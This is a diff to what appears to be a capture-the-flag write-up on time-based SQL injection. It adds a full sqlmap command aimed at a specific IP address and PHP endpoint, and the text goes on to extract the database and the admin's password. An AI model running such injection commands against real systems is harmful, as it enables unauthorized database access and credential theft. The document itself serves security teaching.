@@ -85,10 +85,12 @@ This script is vulnerable by **Time Based SQLi**
 ![sqlsleep](sqlsleep.png)
 
 
-You can exploit manually by using **like method**, or use **SQLMAP** tool
+You can exploit it manually by using **like method**, or use **SQLMAP** tool
 
 
-![sqli](sqli.png)
+```
+sqlmap -u "http://52.49.52.189:8889/16897b180581f697a96038336219b3c5/newFolder/g3tinf0.php?uname=hitman' * -- -" --dbs
+```
 
 
 Now extract all the data, and get the admin's password from the database
